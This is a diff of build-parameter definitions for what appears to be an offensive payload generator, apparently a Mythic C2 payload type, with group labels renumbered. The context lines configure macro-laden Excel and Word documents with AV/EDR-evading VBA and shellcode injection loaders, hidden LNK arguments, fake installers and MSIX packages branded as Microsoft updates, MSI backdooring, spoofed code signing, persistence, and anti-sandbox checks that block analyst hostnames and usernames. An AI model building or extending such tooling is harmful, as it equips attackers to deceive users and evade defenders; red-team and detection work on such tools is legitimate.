@@ -1576,7 +1576,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9l AppDomain Target EXE",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.ChooseOne,
             description="Signed .NET LOLBIN to target. The .config file must be placed alongside this EXE.",
             choices=["AddInProcess64", "AddInProcess32", "dfsvc64", "AppLaunch", "ServiceHubHost"],
@@ -1591,7 +1591,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9m AppDomain Remote URL",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="Optional remote URL to fetch the AppDomain Manager DLL (HTTP/S or WebDAV). Leave blank for local side-by-side DLL mode. Remote mode requires strong-name signing.",
             default_value="",
@@ -1605,7 +1605,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9n LNK Icon",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.ChooseOne,
             description="Icon disguise for the LNK shortcut. Resolves via environment-variable paths on the target host.",
             choices=["pdf", "word", "excel", "powerpoint", "outlook", "onenote", "folder", "document", "notepad", "edge", "generic"],
@@ -1620,7 +1620,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9o LNK Argument Pad",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="Number of leading space characters prepended to arguments to push them off-screen in the shortcut Properties dialog (argument hiding). Recommended: 260.",
             default_value="260",
@@ -1635,7 +1635,7 @@ appdomain (self)""",
   # MalDocs - Excel Backdooring
         BuildParameter(
             name="0.9 Create MalDoc",
-            group_name="MalDoc",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.ChooseOne,
             description="Create/Backdoor Document documents, export VBA module only, Generate All or disable MalDoc generation",
             choices=["None", "Create/Backdoor Document", "VBA Module Only", "Build Matrix"],
@@ -1648,7 +1648,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9a MalDoc Type",
-            group_name="MalDoc",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.ChooseOne,
             description="Create new Excel document or backdoor an existing one",
             choices=["Create New", "Backdoor Existing"],
@@ -1662,7 +1662,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9b Excel Source File",
-            group_name="MalDoc",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.File,
             description="Upload an existing Excel file to backdoor (XLSM/XLS/XLAM)",
             required=False,
@@ -1675,7 +1675,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9c VBA Execution Trigger",
-            group_name="MalDoc",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.ChooseOne,
             description="VBA macro execution trigger method",
             choices=["AutoOpen", "OnClose", "OnSave"],
@@ -1689,7 +1689,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9d Excel Document Name",
-            group_name="MalDoc",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.String,
             description="Name/title for the Excel document",
             default_value="Invoice",
@@ -1702,7 +1702,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9e Obfuscate VBA",
-            group_name="MalDoc",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.Boolean,
             description="Obfuscate VBA code to evade AV/EDR detection",
             default_value=True,
@@ -1715,7 +1715,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9f MalDoc Injection Type",
-            group_name="MalDoc",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.ChooseOne,
             description="Type of payload injection - Command executes trigger binary, Shellcode injects VBA-formatted shellcode",
             choices=["Command Execution", "Shellcode Injection"],
@@ -1729,7 +1729,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9f1 MalDoc Trigger Binary",
-            group_name="MalDoc",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.String,
             description="Executable to run when the VBA trigger fires (Command Execution mode only).",
             default_value="C:\\Windows\\System32\\conhost.exe",
@@ -1743,7 +1743,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9f2 MalDoc Trigger Command",
-            group_name="MalDoc",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.String,
             description="Arguments passed to the trigger binary (Command Execution mode only).",
             default_value="--headless cmd.exe /Q /c erebus.exe | decoy.pdf",
@@ -1757,7 +1757,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9g VBA Loader Technique",
-            group_name="MalDoc",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.ChooseOne,
             description="VBA shellcode loader technique - VirtualAlloc (classic), EnumLocales (callback), QueueUserAPC (self-APC), AddressOfEntryPoint (overwrite child entry point, no RWX), EarlyBird (suspended process APC hijack)",
             choices=["VirtualAlloc + CreateThread", "EnumSystemLocalesA Callback", "QueueUserAPC Injection", "AddressOfEntryPoint Injection", "Early-Bird Injection"],
@@ -1772,7 +1772,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9p MalDoc Output Format",
-            group_name="MalDoc",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.ChooseOne,
             description=(
                 "Output format for the VBA maldoc. "
@@ -1793,7 +1793,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9q DOTM Remote URL",
-            group_name="MalDoc",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.String,
             description=(
                 "URL of the attacker-hosted DOTM template fetched by Word on Document_Open. "
@@ -1811,7 +1811,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9r Matrix Loaders",
-            group_name="MalDoc",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.String,
             description=(
                 "Comma-separated VBA loader techniques for the matrix build. "
@@ -1828,7 +1828,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9s Matrix Triggers",
-            group_name="MalDoc",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.String,
             description=(
                 "Comma-separated VBA execution triggers for the matrix build. "
@@ -1845,7 +1845,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9t Matrix Formats",
-            group_name="MalDoc",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.String,
             description=(
                 "Comma-separated document formats for the matrix build. "
@@ -1862,7 +1862,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9u Matrix Zip Output",
-            group_name="MalDoc",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.Boolean,
             description="Pack the full matrix output directory into a single .zip after build.",
             default_value=True,
@@ -1875,7 +1875,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9v HTTP Stager URL",
-            group_name="MalDoc",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.String,
             description=(
                 "Optional: stage the shellcode via Mythic instead of embedding it in VBA. "
@@ -1896,7 +1896,7 @@ appdomain (self)""",
 
         BuildParameter(
             name = "0.13 Decoy File Inclusion",
-            group_name="Decoy",
+            group_name="13 - Decoy",
             parameter_type = BuildParameterType.Boolean,
             description = "Check whether you want the decoy file in the final payload or not",
             default_value = False,
@@ -1908,7 +1908,7 @@ appdomain (self)""",
 
         BuildParameter(
             name = "0.13 Decoy File",
-            group_name="Decoy",
+            group_name="13 - Decoy",
             parameter_type = BuildParameterType.File,
             description = """Upload a decoy file (PDF/XLSX/etc.).
 If one is not uploaded then an example file will be used.""",
@@ -1919,7 +1919,7 @@ If one is not uploaded then an example file will be used.""",
 
         BuildParameter(
             name = "1.0 DLL Hijacking",
-            group_name="DLL Hijack",
+            group_name="9 - DLL Hijack",
             parameter_type = BuildParameterType.File,
             description = f"""Prepares a given DLL for proxy-based hijacking.
 NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded or compressed payloads.
@@ -1931,7 +1931,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.0a Hijack Loader Architecture",
-            group_name="DLL Hijack",
+            group_name="9 - DLL Hijack",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Select the target architecture for the DLL loader",
             choices = ["x64", "x86"],
@@ -1943,7 +1943,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.0b Hijack Build Configuration",
-            group_name="DLL Hijack",
+            group_name="9 - DLL Hijack",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Select the build configuration for the DLL hijack payload",
             choices = ["release", "debug"],
@@ -1956,7 +1956,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
         # DLL Hijack Built-in Guardrails
         BuildParameter(
             name = "1.1 Use Built-in Guardrails",
-            group_name="Hijack Guardrails",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Use built-in anti-debugging and environment checks instead of custom code",
             default_value = False,
@@ -1967,7 +1967,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1a Check IsDebuggerPresent",
-            group_name="Hijack Guardrails",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable check for IsDebuggerPresent and PEB.BeingDebugged flag",
             default_value = True,
@@ -1979,7 +1979,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1b Check Remote Debugger",
-            group_name="Hijack Guardrails",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable check for remote debugger via NtQueryInformationProcess",
             default_value = True,
@@ -1991,7 +1991,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1c Check Debugger Processes",
-            group_name="Hijack Guardrails",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable check for known debugger and analysis tool processes",
             default_value = True,
@@ -2003,7 +2003,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1d Check Hardware Breakpoints",
-            group_name="Hijack Guardrails",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable check for hardware breakpoints in debug registers",
             default_value = True,
@@ -2015,7 +2015,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1e Check Timing Anomalies",
-            group_name="Hijack Guardrails",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable timing-based debugger detection (RDTSC and Sleep checks)",
             default_value = False,
@@ -2027,7 +2027,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1f Hostname Whitelist",
-            group_name="Hijack Guardrails",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of allowed hostnames (e.g., TARGET-PC,VICTIM-WORKSTATION). Leave empty to disable.",
             default_value = "",
@@ -2039,7 +2039,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1g Block Analysis Hostnames",
-            group_name="Hijack Guardrails",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of blocked hostnames (e.g., SANDBOX,MALWARE-ANALYSIS,VM-WIN10)",
             default_value = "SANDBOX,MALWARE-ANALYSIS,VM-WIN10,ANALYST-PC",
@@ -2051,7 +2051,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1h Block Analysis Usernames",
-            group_name="Hijack Guardrails",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of blocked usernames (e.g., analyst,malware,sandbox,user,admin)",
             default_value = "analyst,malware,sandbox,user,admin",
@@ -2063,7 +2063,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1i IP Whitelist",
-            group_name="Hijack Guardrails",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated IP prefixes to allow (e.g., 10.,192.168.50.). Leave empty to disable.",
             default_value = "",
@@ -2075,7 +2075,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1j IP Blacklist",
-            group_name="Hijack Guardrails",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated IP prefixes to block (e.g., 192.168.122.,172.16.,127.)",
             default_value = "192.168.122.,172.16.,127.",
@@ -2087,7 +2087,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1k Domain Whitelist",
-            group_name="Hijack Guardrails",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of allowed domains (e.g., CORP.CONTOSO.COM,TARGET-DOMAIN.LOCAL). Leave empty to disable.",
             default_value = "",
@@ -2100,7 +2100,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
         # Shellcrypt
         BuildParameter(
             name = "2.0 Compression Type",
-            group_name="Payload Protection",
+            group_name="15 - Payload Protection",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Choose a compression type for the shellcode.",
             choices = [
@@ -2115,7 +2115,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 # Add more decryption support to loaders
         BuildParameter(
             name = "2.1 Encryption Type",
-            group_name="Payload Protection",
+            group_name="15 - Payload Protection",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Choose an encryption type for the shellcode.",
             choices = [
@@ -2129,7 +2129,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "2.2 Encryption Key",
-            group_name="Payload Protection",
+            group_name="15 - Payload Protection",
             parameter_type = BuildParameterType.String,
             description = """Choose an encryption key. A random one will be
 generated if none have been entered.""",
@@ -2138,7 +2138,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name = "2.3 Encoding Type",
-            group_name="Payload Protection",
+            group_name="15 - Payload Protection",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Choose an encoding type for the shellcode.",
             choices = [
@@ -2154,7 +2154,7 @@ generated if none have been entered.""",
         # Archive
         BuildParameter(
             name = "3.0 Container Type",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "Primary container / execution layer.\n"
@@ -2168,7 +2168,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name = "3.0T Outer Transport",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "Optional outer transport wrapper. Wraps the primary container inside an\n"
@@ -2187,7 +2187,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="3.AI0 MSIX Hosting URL",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description=(
                 "Full HTTPS URL where the operator will host the signed MSIX package.\n"
@@ -2203,7 +2203,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="3.AI1 MSIX Package Name",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description="MSIX identity package name. Shown in Settings > Apps. No spaces.",
             default_value="Microsoft.WindowsUpdate",
@@ -2214,7 +2214,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="3.AI2 MSIX Display Name",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description="Friendly display name shown in App Installer UI and Settings > Apps.",
             default_value="Windows Update Assistant",
@@ -2226,7 +2226,7 @@ generated if none have been entered.""",
         # Electron fake-installer container parameters (hidden unless Electron selected)
         BuildParameter(
             name = "3.E0 Electron Product Name",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = "Display name shown in the fake installer window and NSIS metadata",
             default_value = "Acme Installer",
@@ -2236,7 +2236,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E1 Electron Publisher",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = "Publisher string embedded in the installer metadata",
             default_value = "Acme Corporation",
@@ -2246,7 +2246,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E2 Electron Version",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = "Product version embedded in the installer",
             default_value = "1.0.0",
@@ -2256,7 +2256,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E3 Electron Architecture",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Target architecture for the Electron NSIS installer",
             choices = ["x64", "ia32"],
@@ -2267,7 +2267,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E4 Electron Entry Format",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "Which spawn mechanism the wizard uses at install time:\n"
@@ -2283,7 +2283,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E5 Electron DLL Entry Point",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = "rundll32 entry point name (only used when Entry Format = dll)",
             default_value = "DllMain",
@@ -2294,7 +2294,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E7 Electron File Description",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = (
                 "PE file description string shown on the Details tab of the "
@@ -2307,7 +2307,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E8 Electron Copyright",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = (
                 "Legal copyright string embedded in the PE resources "
@@ -2320,7 +2320,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E6a Electron Custom Icon",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.File,
             description = (
                 "Optional PNG to use as the fake-installer window + exe icon.\n"
@@ -2335,7 +2335,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E6b Electron Payload Zip",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.File,
             description = (
                 "Optional ZIP containing a pre-built payload and/or DLL to use instead of\n"
@@ -2351,7 +2351,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name = "3.E9 Enable Electron Guardrails",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Master switch for the Electron wrapper's anti-sandbox guardrails. "
@@ -2366,7 +2366,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9a Dwell Time (ms)",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = (
                 "Minimum time (ms) the wizard must be visible before the Install "
@@ -2381,7 +2381,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9b Require Mouse Movement",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Require a real mousemove event (non-zero movementX/Y delta) "
@@ -2397,7 +2397,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9c Check Debugger",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Refuse to stage if a Node inspector / debugger is attached to "
@@ -2411,7 +2411,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9d Check Sandbox Env Vars",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Refuse to stage if environment variables from common sandbox "
@@ -2425,7 +2425,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9e Check Default Bad Usernames",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Refuse to stage if the current username is a well-known sandbox "
@@ -2439,7 +2439,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9f Check Default Bad Hostnames",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Refuse to stage if the current hostname contains common sandbox "
@@ -2453,7 +2453,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9g Hostname Whitelist",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = (
                 "Comma-separated list of hostnames (or suffixes) that are ALLOWED "
@@ -2467,7 +2467,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9h Hostname Blocklist",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = (
                 "Comma-separated list of hostnames that are BLOCKED from running "
@@ -2481,7 +2481,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9i Username Whitelist",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of allowed usernames. Empty = no whitelist check.",
             default_value = "",
@@ -2492,7 +2492,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9j Username Blocklist",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of blocked usernames. Empty = no blocklist check.",
             default_value = "",
@@ -2503,7 +2503,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9k Min Screen Width",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = (
                 "Refuse to stage if the primary display's width is less than this "
@@ -2518,7 +2518,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9l Min Screen Height",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = "Refuse to stage if the primary display's height is less than this many pixels. 0 disables the check.",
             default_value = "720",
@@ -2529,7 +2529,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9m Min CPU Count",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = "Refuse to stage if the host has fewer than N logical CPUs (most sandbox VMs use 1-2). 0 disables.",
             default_value = "2",
@@ -2540,7 +2540,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9n Min Memory (MB)",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = "Refuse to stage if the host has less than N MB of RAM. 0 disables.",
             default_value = "2048",
@@ -2551,7 +2551,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9o Max Idle Seconds",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = "Refuse to stage if the system idle time is greater than this many seconds (unattended box = suspicious). 0 disables.",
             default_value = "0",
@@ -2562,7 +2562,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9p Pre-Spawn Delay (ms)",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = (
                 "Sleep this many ms inside the Install handler AFTER every other "
@@ -2578,7 +2578,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9q Guardrail Debug Mode",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "TESTING ONLY. When True, guardrail failures are surfaced visibly: "
@@ -2597,7 +2597,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="3.1 Compression Level",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.ChooseOne,
             description="Select compression level (9 is max).",
             choices=["0", "1", "3", "5", "7", "9"],
@@ -2613,7 +2613,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="3.2 Archive Password",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description="Optional password for the archive (leave empty for none).",
             default_value="",
@@ -2631,7 +2631,7 @@ generated if none have been entered.""",
         # Electron persistence parameters
         BuildParameter(
             name = "3.P0 Enable Persistence",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Copy the loader to a permanent location and register a persistence mechanism "
@@ -2649,7 +2649,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.P1 Persistence Method",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "Persistence mechanism to register after install:\n"
@@ -2667,7 +2667,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.P2 Persistence Name",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = (
                 "Registry value name, scheduled task name, and install subdirectory name "
@@ -2682,7 +2682,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.P3 Persistence Install Dir",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "Base directory where the loader is copied before persistence is registered.\n"
@@ -2700,7 +2700,7 @@ generated if none have been entered.""",
         #ISO
         BuildParameter(
             name="4.0 ISO Volume ID",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description="ISO Volume name seen in Explorer.",
             default_value="EREBUS",
@@ -2712,7 +2712,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="4.1 ISO enable Autorun",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.Boolean,
             description="Enable Autorun for ISO",
             default_value=False,
@@ -2724,7 +2724,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="4.2 ISO Backdoor File",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.File,
             description="Backdoor an existing ISO",
             required=False,
@@ -2734,7 +2734,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name="5.0 MSI Product Name",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description="Application name shown in MSI/UI",
             default_value="System Updater",
@@ -2745,7 +2745,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name="5.1 MSI Manufacturer",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description="Company name shown in MSI metadata",
             default_value="Microsoft Corporation",
@@ -2756,7 +2756,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name="5.2 MSI Install Scope",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.ChooseOne,
             description="Machine=Admin Required (Program Files), User=No Admin (AppData)",
             choices=["User", "Machine"],
@@ -2768,7 +2768,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="5.3 Enable MSI Backdoor",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.Boolean,
             description="Enable backdoor functionality for MSI installer",
             default_value=False,
@@ -2779,7 +2779,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name="5.4 MSI Backdoor File",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.File,
             description="Backdoor an existing MSI installer by injecting payload execution",
             required=False,
@@ -2790,7 +2790,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name="5.5 MSI Attack Type",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.ChooseOne,
             description="""Attack vector for MSI backdoor injection:
 - execute: Run command via CustomAction (stealthiest)
@@ -2808,7 +2808,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name="5.6 MSI Entry Point",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description="DLL export function or script function name (required for load-dll/dotnet/script attacks)",
             default_value="",
@@ -2823,7 +2823,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name="5.7 MSI Command Arguments",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description="Command line arguments for execute/run-exe attacks",
             default_value="",
@@ -2838,7 +2838,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name="5.8 MSI Execution Condition",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description="MSI condition for payload execution (default: NOT REMOVE = run on install only)",
             default_value="NOT REMOVE",
@@ -2851,7 +2851,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name="5.9 MSI Custom Action Name",
-            group_name="Containers",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description="Custom action name (leave empty for random generation)",
             default_value="",
@@ -2865,7 +2865,7 @@ generated if none have been entered.""",
         #Codesigning
         BuildParameter(
             name="6.0 Codesign Loader",
-            group_name="Codesigning",
+            group_name="17 - Codesigning",
             parameter_type=BuildParameterType.Boolean,
             description="Sign the loader with a code signing cert",
             required=False,
@@ -2876,7 +2876,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="6.1 Codesign Type",
-            group_name="Codesigning",
+            group_name="17 - Codesigning",
             parameter_type=BuildParameterType.ChooseOne,
             description="Choose how you want to sign the payload",
             choices=["SelfSign", "Spoof URL", "Provide Certificate"],
@@ -2888,7 +2888,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="6.2 Codesign CN",
-            group_name="Codesigning",
+            group_name="17 - Codesigning",
             parameter_type=BuildParameterType.String,
             default_value="Microsoft Corporation",
             description="Common Name (CN) for self-signed cert",
@@ -2900,7 +2900,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="6.3 Codesign Orgname",
